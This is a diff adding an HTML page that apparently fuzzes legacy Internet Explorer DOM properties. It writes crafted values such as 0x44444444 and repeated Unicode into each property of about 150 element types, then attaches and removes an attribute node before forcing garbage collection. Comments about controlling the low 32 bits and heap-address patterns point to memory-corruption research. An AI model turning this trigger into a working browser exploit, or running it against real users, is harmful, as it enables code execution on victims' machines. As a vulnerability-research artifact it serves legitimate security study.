@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<meta http-equiv="X-UA-Compatible" content="IE=7">
+<script>
+  onerror = function(s,f,l){alert(s + " on line " + l)};
+</script><script>
+  var aoElements = [
+    document.createElement("a"),
+    document.createElement("abbr"),
+    document.createElement("acronym"),
+    document.createElement("address"),
+    document.createElement("applet"),
+    document.createElement("area"),
+    document.createElement("article"),
+    document.createElement("aside"),
+    document.createElement("audio"),
+    document.createElement("b"),
+    document.createElement("base"),
+    document.createElement("basefont"),
+    document.createElement("bdi"),
+    document.createElement("bdo"),
+    document.createElement("bgsound"),
+    document.createElement("big"),
+    document.createElement("blink"),
+    document.createElement("blockquote"),
+    document.createElement("body"),
+    document.createElement("br"),
+    document.createElement("button"),
+    document.createElement("canvas"),
+    document.createElement("caption"),
+    document.createElement("center"),
+    document.createElement("cite"),
+    document.createElement("code"),
+    document.createElement("col"),
+    document.createElement("colgroup"),
+    document.createElement("command"),
+    document.createElement("content"),
+    document.createElement("data"),
+    document.createElement("datalist"),
+    document.createElement("dd"),
+    document.createElement("del"),
+    document.createElement("details"),
+    document.createElement("dfn"),
+    document.createElement("dialog"),
+    document.createElement("dir"),
+    document.createElement("div"),
+    document.createElement("dl"),
+    document.createElement("dt"),
+    document.createElement("element"),
+    document.createElement("em"),
+    document.createElement("embed"),
+    document.createElement("fieldset"),
+    document.createElement("figcaption"),
+    document.createElement("figure"),
+    document.createElement("font"),
+    document.createElement("footer"),
+    document.createElement("form"),
+    document.createElement("frame"),
+    document.createElement("frameset"),
+    document.createElement("h1"),
+    document.createElement("h2"),
+    document.createElement("h3"),
+    document.createElement("h4"),
+    document.createElement("h5"),
+    document.createElement("h6"),
+    document.createElement("head"),
+    document.createElement("header"),
+    document.createElement("hgroup"),
+    document.createElement("hr"),
+    document.createElement("html"),
+    document.createElement("i"),
+    document.createElement("iframe"),
+    document.createElement("image"),
+    document.createElement("img"),
+    document.createElement("input"),
+    (o = document.createElement("input"), o.type="button", o),
+    (o = document.createElement("input"), o.type="checkbox", o),
+    (o = document.createElement("input"), o.type="file", o),
+    (o = document.createElement("input"), o.type="hidden", o),
+    (o = document.createElement("input"), o.type="image", o),
+    (o = document.createElement("input"), o.type="password", o),
+    (o = document.createElement("input"), o.type="radio", o),
+    (o = document.createElement("input"), o.type="reset", o),
+    (o = document.createElement("input"), o.type="submit", o),
+    (o = document.createElement("input"), o.type="text", o),
+    document.createElement("ins"),
+    document.createElement("isindex"),
+    document.createElement("kbd"),
+    document.createElement("keygen"),
+    document.createElement("label"),
+    document.createElement("legend"),
+    document.createElement("li"),
+    document.createElement("link"),
+    document.createElement("listing"),
+    document.createElement("main"),
+    document.createElement("map"),
+    document.createElement("mark"),
+    document.createElement("marquee"),
+    document.createElement("menu"),
+    document.createElement("menuitem"),
+    document.createElement("meta"),
+    document.createElement("meter"),
+    document.createElement("multicol"),
+    document.createElement("nav"),
+    document.createElement("nobr"),
+    document.createElement("noembed"),
+    document.createElement("noframes"),
+    document.createElement("noscript"),
+    document.createElement("object"),
+    document.createElement("ol"),
+    document.createElement("optgroup"),
+    document.createElement("option"),
+    document.createElement("output"),
+    document.createElement("p"),
+    document.createElement("param"),
+    document.createElement("picture"),
+    document.createElement("plaintext"),
+    document.createElement("pre"),
+    document.createElement("progress"),
+    document.createElement("q"),
+    document.createElement("rp"),
+    document.createElement("rt"),
+    document.createElement("rtc"),
+    document.createElement("ruby"),
+    document.createElement("s"),
+    document.createElement("samp"),
+    document.createElement("script"),
+    document.createElement("section"),
+    document.createElement("select"),
+    document.createElement("shadow"),
+    document.createElement("small"),
+    document.createElement("source"),
+    document.createElement("spacer"),
+    document.createElement("span"),
+    document.createElement("strike"),
+    document.createElement("strong"),
+    document.createElement("style"),
+    document.createElement("sub"),
+    document.createElement("summary"),
+    document.createElement("sup"),
+    document.createElement("table"),
+    document.createElement("tbody"),
+    document.createElement("td"),
+    document.createElement("template"),
+    document.createElement("textarea"),
+    document.createElement("tfoot"),
+    document.createElement("th"),
+    document.createElement("thead"),
+    document.createElement("time"),
+    document.createElement("title"),
+    document.createElement("tr"),
+    document.createElement("track"),
+    document.createElement("tt"),
+    document.createElement("u"),
+    document.createElement("ul"),
+    document.createElement("var"),
+    document.createElement("video"),
+    document.createElement("wbr"),
+    document.createElement("xmp"),
+    document.createElement("x")
+  ];
+  var dxFiltered = {
+    // Not that "number" means a number converted to string and results in an address of the form 0x003?003? or 0x003?003?003?003?
+    "spellcheck":               [true, false],
+    "contentEditable":          ["true", "false", "inherit"],
+    "border":                   "number",
+    "APPLET.codeType":          "false",    // should be mime/type
+    "APPLET.height":            "number",
+    "APPLET.type":              "false",    // should be mime/type
+    "APPLET.width":             "number",
+    "BGSOUND.balance":          [-10000, 10000], // Limited to small numbers (lower 16 bits?)
+    "BGSOUND.loop":             Number,     // Full control over lower 32-bits
+    "BGSOUND.volume":           [-10000, 0], // Limited to small numbers (lower 8 bits?)
+    "BODY.bottomMargin":        "number",
+    "BODY.leftMargin":          "number",
+    "BODY.rightMargin":         "number",
+    "BODY.topMargin":           "number",
+    "BUTTON.type":              ["button", "reset", "submit"],
+    "COL.span":                 Number,   // Limited to small numbers (lower 8 bits?)
+    "COL.width":                "number",
+    "COLGROUP.span":            Number,   // Limited to small numbers (lower 8 bits?)
+    "COLGROUP.width":           "number",
+    "EMBED.hidden":             ["true", "false"],
+    "FONT.size":                "number",
+    "FORM.method":              ["get", "post"],
+    "FRAME.frameSpacing":       "number",
+    "FRAME.marginHeight":       "number",
+    "FRAME.marginWidth":        "number",
+    "FRAME.scrolling":          ["yes", "no", "auto"],
+    "FRAMESET.frameSpacing":    "number",
+    "HR.size":                  "number",
+    "HR.width":                 "number",
+    "IFRAME.frameSpacing":      "number",
+    "IFRAME.height":            "number",
+    "IFRAME.marginHeight":      "number",
+    "IFRAME.marginWidth":       "number",// assumed, not tested
+    "IFRAME.scrolling":         ["yes", "no", "auto"],
+    "IFRAME.width":             "number",// assumed, not tested
+    "IMG.loop":                 Number,     // Full control over lower 32-bits
+    "IMG.start":                ["fileopen", "mouseover"],
+    "INPUT.loop":               Number,     // Full control over lower 32-bits
+    "INPUT.start":              ["fileopen", "mouseover"],
+    "INPUT.type":               ["button", "checkbox", "email", "..."],
+    "MARQUEE.behavior":         ["scroll", "slide", "alternate"],
+    "MARQUEE.direction":        ["left", "right", "up", "down"],
+    "MARQUEE.height":           "number",
+    "MARQUEE.width":            "number",
+    "OBJECT.codeType":          "false",    // should be mime/type
+    "OBJECT.height":            "number",   
+    "OBJECT.type":              "false",    // should be mime/type
+    "OBJECT.width":             "number",
+    "SELECT.length":            undefined, // Actually not the same issue, but a separate DoS.
+    "TABLE.cellPadding":        "number", // Valid values may be limited to small numbers.
+    "TABLE.cellSpacing":        "number", // Valid values may be limited to small numbers.
+    "TABLE.height":             "number",
+    "TABLE.width":              "number",
+    "TD.colSpan":               Number, // Limited to small numbers (lower 8 bits?)
+    "TD.height":                "number",
+    "TD.width":                 "number",
+    "TEXTAREA.wrap":            ["soft", "hard"],
+    "TH.colSpan":               Number, // Limited to small numbers (lower 8 bits?)
+    "TH.height":                "number",
+    "TH.width":                 "number",
+    "TR.colSpan":               Number, // Limited to small numbers (lower 8 bits?)
+    "TR.height":                "number",
+    "TR.width":                 "number",
+  "": 0};
+  var asPropertyNames = [], sStartAt = "", bAlerts = true;
+  fTest();
+  function fTest() {
+    while (1) {
+      sPropertyName = asPropertyNames.shift();
+      if (!sPropertyName) {
+        oElement = aoElements.shift();
+        if (!oElement) {
+          document.title = sStartAt ? sStartAt + " not found" : "done";
+          return;
+        };
+        if (oElement.tagName == oElement.tagName.toLowerCase()) {
+          continue; // Not implemented
+        }
+        asPropertyNames = [];
+        for (var x in oElement) asPropertyNames.push(x);
+        asPropertyNames.sort();
+        sPropertyName = asPropertyNames.shift();
+      };
+      var sPropertyValue = "";
+      try { sPropertyValue += oElement[sPropertyName]; } catch (e) { };
+      document.title = oElement.tagName + "." + sPropertyName + ": " + typeof oElement[sPropertyName] + " " + sPropertyValue;
+      if (sStartAt && sStartAt != oElement.tagName + "." + sPropertyName) {
+        continue;
+      }
+      sStartAt = null;
+      if ((sPropertyName in dxFiltered) || (oElement.tagName + "." + sPropertyName in dxFiltered)) {
+        continue;
+      } else {
+        if (bAlerts) bAlerts = confirm(document.title);
+        try {
+          oElement[sPropertyName] = true;
+          oElement[sPropertyName] = "true";
+        } catch (e) {};
+        try {
+          oElement[sPropertyName] = -0x100+0x11;
+          oElement[sPropertyName] = -0x10000+0x2222;
+        } catch (e) {};
+        try {
+          oElement[sPropertyName] = 0x11;
+          oElement[sPropertyName] = 0x2222;
+          oElement[sPropertyName] = 0x44444444;
+        } catch (e) {};
+        try {
+          oElement[sPropertyName] = "inherit";
+          oElement[sPropertyName] = "UUUU";
+          oElement[sPropertyName] = "\u6666\u6666";
+        } catch (e) {};
+        if ((typeof oElement[sPropertyName]) == "string" && parseInt(oElement[sPropertyName]).toString() == oElement[sPropertyName]) {
+          try {
+            oElement[sPropertyName] = 3;
+            oElement[sPropertyName] = 33;
+            oElement[sPropertyName] = 3333;
+          } catch (e) {};
+        }
+        var sPropertyValue = "";
+        try { sPropertyValue += oElement[sPropertyName]; } catch (e) { };
+        document.title += " => " + typeof oElement[sPropertyName] + " " + sPropertyValue
+        if (bAlerts) bAlerts = confirm(document.title);
+        var oAttr = document.createAttribute(sPropertyName);
+        oAttr.nodeValue = document.createTextNode("");
+        try { oElement.setAttributeNode(oAttr); } catch (e) {};
+        oElement.removeAttributeNode(oAttr);
+        CollectGarbage();
+        return setTimeout(fTest);
+      };
+    };
+  };
+</script>
